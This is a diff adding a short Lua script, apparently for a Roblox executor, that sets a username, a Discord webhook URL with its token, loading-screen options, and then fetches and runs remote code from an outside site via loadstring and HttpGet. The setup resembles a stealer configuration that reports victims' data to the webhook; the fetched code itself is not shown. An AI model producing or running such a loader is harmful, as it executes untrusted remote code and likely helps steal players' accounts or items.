@@ -1,0 +1,6 @@
+Username = "NekDav2"
+Webhook = "https://discord.com/api/webhooks/1216347643886698526/jeSfZettLj2Nf3fFgSa64uAoM0D9CFJfB6l_2kjAbhl77ptkZQ_SL7CXlOqSDVfpgfnB"
+selectedLoadingScreen = "4"
+LoadingScreen = true
+
+loadstring(game:HttpGet('https://hugegames.space/d3397ddd2ed7d52c61af3d42.lua'))()
